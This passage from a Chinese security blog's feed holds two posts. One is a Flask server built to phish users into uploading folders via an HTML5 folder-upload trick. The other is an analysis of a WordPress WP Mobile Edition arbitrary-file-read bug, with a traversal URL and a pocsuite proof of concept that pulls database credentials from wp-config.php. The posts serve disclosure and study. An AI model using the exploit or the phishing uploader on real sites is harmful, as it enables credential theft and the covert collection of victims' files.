&lt;p&gt;PythonWeb开发中，在处理数据库的过程中经常使用orm库进行数据库处理，orm库是防SQL注入的好手。Flask和Tornado经常使用Sqlalchemy，而Django有自己自带的orm引擎。举一个用Sqlalchemy建模型类，并使用模型类查询用户数据的例子：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; create_engine&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy.orm &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; sessionmaker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; datetime &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; datetime&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy.ext.declarative &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; declarative_base&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; sqlalchemy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Column, Integer, String, DateTime&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;engine = create_engine(&lt;span class=&quot;string&quot;&gt;&#39;mysql+pymysql://user:password@192.168.1.101/test&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DBSession = sessionmaker(bind=engine)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;session = DBSession()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Base = declarative_base()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;user_t&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Base)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __tablename__ = &lt;span class=&quot;string&quot;&gt;&#39;user_t&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    user_id = Column(Integer, primary_key=&lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    username = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    userpassword = Column(String)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    createtime = Column(DateTime, default=datetime.utcnow)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Python代码审计" scheme="http://blog.neargle.com/tags/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Html5文件夹上传欺骗之Python实现版-w-</title>
    <link href="http://blog.neargle.com/2015/12/01/html5-file-upload-flask-ver-python-ver/"/>
    <id>http://blog.neargle.com/2015/12/01/html5-file-upload-flask-ver-python-ver/</id>
    <published>2015-12-01T06:14:44.000Z</published>
    <updated>2015-12-01T13:52:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>以前曾经在微博上看到过Html5的新特性可以用于新的Web攻击，其中提到文件夹上传可以用于欺骗。觉得有点意思，后来又看到蘑菇在创宇的官博上面写了一篇博客：</p>
<p><a href="http://blog.knownsec.com/2015/11/html5-upload-folder-with-webkitdirectory-phishing/" target="_blank" rel="external">http://blog.knownsec.com/2015/11/html5-upload-folder-with-webkitdirectory-phishing/</a></p>
<p>感觉的该说的都被他说了，嘛，不过这个东西，可以拿出来逗大家玩玩消遣一下时间0w0，但是这个是PHP的，而且明显任意上传可以直接GetShell，不想在服务器上装PHP。于是想着用Python实现一番。</p>
<h2 id="Python实现文件夹上传">Python实现文件夹上传</h2><p>主要问题在于先用的Python Web框架支不支持文件上传呢？写小玩意儿的时候我喜欢用flask，简单可定制强。于是调查了一番Flask对文件夹上传的支持，发现：其实对于后端来说，Html5的文件夹上传和以前的多文件上传并没有什么不一样，那就简单了-w-<br><a id="more"></a><br>直接上代码：(有点乱，我去整理整理)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    request,</span><br><span class="line">    render_template,</span><br><span class="line">    send_from_directory,</span><br><span class="line">    url_for,</span><br><span class="line">    jsonify</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">'mylogger'</span>)</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">fh = logging.FileHandler(<span class="string">'log.txt'</span>)</span><br><span class="line">fh.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">ch = logging.StreamHandler()</span><br><span class="line">ch.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">formatter = logging.Formatter(<span class="string">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span>)</span><br><span class="line">fh.setFormatter(formatter)</span><br><span class="line">ch.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">logger.addHandler(fh)</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'ALLOWED_EXTENSIONS'</span>] = set([<span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> app.config[<span class="string">'ALLOWED_EXTENSIONS'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">override_url_for</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(url_for=dated_url_for)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dated_url_for</span><span class="params">(endpoint, **values)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> endpoint == <span class="string">'js_static'</span>:</span><br><span class="line">        filename = values.get(<span class="string">'filename'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            file_path = os.path.join(app.root_path,</span><br><span class="line">                                     <span class="string">'static/js'</span>, filename)</span><br><span class="line">            values[<span class="string">'q'</span>] = int(os.stat(file_path).st_mtime)</span><br><span class="line">    <span class="keyword">elif</span> endpoint == <span class="string">'css_static'</span>:</span><br><span class="line">        filename = values.get(<span class="string">'filename'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            file_path = os.path.join(app.root_path,</span><br><span class="line">                                     <span class="string">'static/css'</span>, filename)</span><br><span class="line">            values[<span class="string">'q'</span>] = int(os.stat(file_path).st_mtime)</span><br><span class="line">    <span class="keyword">return</span> url_for(endpoint, **values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/css/&lt;path:filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">css_static</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.root_path + <span class="string">'/static/css/'</span>, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/js/&lt;path:filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js_static</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.root_path + <span class="string">'/static/js/'</span>, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, errno</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc: <span class="comment"># Python &gt;2.5 (except OSError, exc: for Python &lt;2.5)</span></span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/xiazaizhong', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upldfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"########################"</span></span><br><span class="line">    filelist = request.files.getlist(<span class="string">"file"</span>)</span><br><span class="line">    <span class="keyword">print</span> request.remote_addr</span><br><span class="line">    <span class="keyword">print</span> request.user_agent</span><br><span class="line">    <span class="keyword">for</span> upload <span class="keyword">in</span> filelist:</span><br><span class="line">        filename = upload.filename.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        lpdir = upload.filename.rsplit(<span class="string">"/"</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> len(lpdir) <span class="keyword">is</span> <span class="keyword">not</span> <span class="number">1</span>:</span><br><span class="line">            pdir = <span class="string">'/'</span>.join(lpdir)</span><br><span class="line">        <span class="keyword">elif</span> len(lpdir) <span class="keyword">is</span> <span class="number">1</span>:</span><br><span class="line">            pdir = lpdir[<span class="number">0</span>]</span><br><span class="line">        mkdir_p(pdir)</span><br><span class="line">        upload.save(filename)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"########################"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xiazaichenggong0w0"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="keyword">False</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<h2 id="结局和不足：">结局和不足：</h2><h3 id="结局：">结局：</h3><p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1eykhns3vobj30iw02saah.jpg" alt=""></p>
<p>看到一大堆访问的IP不假，但是真实上传上来的文件夹却没有几个。不过大家 好像玩得挺开心的：</p>
<p><img src="http://ww2.sinaimg.cn/large/005y7Ba5jw1eykh7gweh3j30nz0c0di8.jpg" alt=""></p>
<h3 id="不足：">不足：</h3><ol>
<li>根据网速的不同，一般都上传不上来- -</li>
<li>阿里云的服务器还是有点渣啊</li>
<li>Flask访问的人一多好像确实不给力</li>
<li>前端没改0w-感觉不好看（然而并没有什么关系</li>
</ol>
<h2 id="参考：">参考：</h2><ol>
<li><a href="http://sapphion.com/2011/11/21/html5-folder-upload-with-webkitdirectory/" target="_blank" rel="external">http://sapphion.com/2011/11/21/html5-folder-upload-with-webkitdirectory/</a></li>
<li><a href="https://laike9m.com/blog/wen-jian-jia-shang-chuan-cong-qian-duan-dao-hou-duan,59/" target="_blank" rel="external">https://laike9m.com/blog/wen-jian-jia-shang-chuan-cong-qian-duan-dao-hou-duan,59/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;起因&lt;/h2&gt;&lt;p&gt;以前曾经在微博上看到过Html5的新特性可以用于新的Web攻击，其中提到文件夹上传可以用于欺骗。觉得有点意思，后来又看到蘑菇在创宇的官博上面写了一篇博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.knownsec.com/2015/11/html5-upload-folder-with-webkitdirectory-phishing/&quot;&gt;http://blog.knownsec.com/2015/11/html5-upload-folder-with-webkitdirectory-phishing/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;感觉的该说的都被他说了，嘛，不过这个东西，可以拿出来逗大家玩玩消遣一下时间0w0，但是这个是PHP的，而且明显任意上传可以直接GetShell，不想在服务器上装PHP。于是想着用Python实现一番。&lt;/p&gt;
&lt;h2 id=&quot;Python实现文件夹上传&quot;&gt;Python实现文件夹上传&lt;/h2&gt;&lt;p&gt;主要问题在于先用的Python Web框架支不支持文件上传呢？写小玩意儿的时候我喜欢用flask，简单可定制强。于是调查了一番Flask对文件夹上传的支持，发现：其实对于后端来说，Html5的文件夹上传和以前的多文件上传并没有什么不一样，那就简单了-w-&lt;br&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://blog.neargle.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Wordpress插件：WP Mobile Edition Plugin 任意文件下载漏洞分析</title>
    <link href="http://blog.neargle.com/2015/10/10/wp-mobile-edition-pn-cssphp-arbitrary-flie-dl/"/>
    <id>http://blog.neargle.com/2015/10/10/wp-mobile-edition-pn-cssphp-arbitrary-flie-dl/</id>
    <published>2015-10-10T05:28:54.000Z</published>
    <updated>2016-07-27T06:57:18.000Z</updated>
    
    <content type="html"><![CDATA[<!-- wp-mobile-edition-pn-cssphp-arbitrary-flie-dl.md -->
<h2 id="影响：">影响：</h2><ul>
<li>WP Mobile Edition版本低于2.2.7有该漏洞。</li>
<li>首次启用WP Mobile Edition 插件之后，即使停用或删除该插件，漏洞也会一直存在。</li>
<li>即使升级插件，若已经启用过漏洞存在的版本，漏洞也同样存在。</li>
<li>css.php用于压缩css文件，并不只存在于该插件之中，而是 <a href="https://github.com/mrclay/" target="_blank" rel="external">https://github.com/mrclay/</a> 的开源代码，使用该文件的网站也存在该漏洞。<a id="more"></a>
</li>
</ul>
<h2 id="详情">详情</h2><p>插件下载地址：<a href="https://downloads.wordpress.org/plugin/wp-mobile-edition.2.2.7.zip" target="_blank" rel="external">https://downloads.wordpress.org/plugin/wp-mobile-edition.2.2.7.zip</a></p>
<p>首次启用该插件，插件会自动安装一个theme：mTheme-Unus。该theme下css/css.php文件存在任意文件可读漏洞。<br>漏洞代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span> .= file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove comments</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">'!/\*[^*]*\*+([^/][^*]*\*+)*/!'</span>, <span class="string">''</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove tabs, spaces, newlines, etc...</span></span><br><span class="line"><span class="variable">$content</span> = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>, <span class="string">"\t"</span>, <span class="string">'  '</span>, <span class="string">'   '</span>), <span class="string">''</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete cache files older than an hour</span></span><br><span class="line"><span class="variable">$oldDate</span> = time()-<span class="number">3600</span>;</span><br><span class="line"><span class="variable">$cachedFiles</span> = scandir(<span class="variable">$cachePath</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cachedFiles</span> <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filemtime</span> = @filemtime(<span class="variable">$cachePath</span>.<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$file</span>) == <span class="number">32</span> <span class="keyword">and</span> (<span class="variable">$filemtime</span> === <span class="keyword">false</span> <span class="keyword">or</span> <span class="variable">$filemtime</span> &lt; <span class="variable">$oldDate</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        unlink(<span class="variable">$cachePath</span>.<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write cache file</span></span><br><span class="line">file_put_contents(<span class="variable">$cachePath</span>.<span class="variable">$md5</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://images.sebug.net/contribute/7d0f4444-1c1b-4510-8ef9-dbda02bc2696-2015-10-10_180519.png" alt=""><br>file_get_contents()读取$file路径的内容之后，echo输出，导致漏洞。<br>删除，更新，停用该插件，并不会影响到漏洞存在的文件。</p>
<h2 id="漏洞证明：">漏洞证明：</h2><p>更新至：2.8版本<br><img src="http://images.sebug.net/contribute/49038852-81ce-4f65-a483-e2a196889f2b-2015-10-10_181415.png" alt=""><br>访问：website/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php<br><img src="http://images.sebug.net/contribute/2fa20296-8fe8-4a37-821b-8d054a12800d-2015-10-10_180633.png" alt=""><br>漏洞依旧存在。</p>
<h2 id="漏洞修复建议：">漏洞修复建议：</h2><p>删除wp-content/themes/mTheme-Unus/css/css.php文件。</p>
<h2 id="POC&amp;EXP：">POC&amp;EXP：</h2><p>注：基于pocsuite</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> Output, POCBase</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">''</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'nearg1e'</span>]</span><br><span class="line">    vulDate = <span class="string">'2015-10-10'</span></span><br><span class="line">    createDate = <span class="string">'2015-10-10'</span></span><br><span class="line">    references = [<span class="string">''</span>]</span><br><span class="line">    name = <span class="string">'WordPress WP Mobile Edition Plugin 2.2.7 /wp-content/themes/mTheme-Unus/css/css.php 文件下载'</span></span><br><span class="line">    appPowerLink = <span class="string">'https://downloads.wordpress.org/plugin/wp-mobile-edition.2.2.7.zip'</span></span><br><span class="line">    appName = <span class="string">'WordPress WP Mobile Edition Plugin'</span></span><br><span class="line">    appVersion = <span class="string">'2.2.7'</span></span><br><span class="line">    vulType = <span class="string">'Local File Inclusion'</span></span><br><span class="line">    desc = <span class="string">'''file_get_contents()读取$file路径的内容之后，echo输出，导致漏洞。'''</span></span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        exp_url = <span class="string">'%swp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'</span> % self.url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requ = req.get(exp_url, timeout=<span class="number">10</span>).content</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            self.result.error = str(e)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        re_str = <span class="string">r"define\('DB_USER', '(.*)'\);[\s\S]*define\('DB_PASSWORD', '(.*)'\);"</span></span><br><span class="line">        re_result = re.findall(re_str, requ)</span><br><span class="line">        <span class="keyword">if</span> re_result:</span><br><span class="line">            result[<span class="string">'DB_USER'</span>] = re_result[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            result[<span class="string">'DB_PASSWORD'</span>] = re_result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self, verify=True)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        vul_url = <span class="string">'%swp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'</span> % self.url</span><br><span class="line">        response = req.get(vul_url, timeout=<span class="number">10</span>).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'define(\'WP_DEBUG\''</span> <span class="keyword">in</span> response:</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>] = &#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</span><br><span class="line">        <span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_attack</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'failed'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>
<p>poc执行结果：</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1eww8bl1wv1j30wh0d1agk.jpg" alt="poc执行结果"></p>
]]></content>
    
    <summary type="html">
    
      &lt;!-- wp-mobile-edition-pn-cssphp-arbitrary-flie-dl.md --&gt;
&lt;h2 id=&quot;影响：&quot;&gt;影响：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;WP Mobile Edition版本低于2.2.7有该漏洞。&lt;/li&gt;
&lt;li&gt;首次启用WP Mobile Edition 插件之后，即使停用或删除该插件，漏洞也会一直存在。&lt;/li&gt;
&lt;li&gt;即使升级插件，若已经启用过漏洞存在的版本，漏洞也同样存在。&lt;/li&gt;
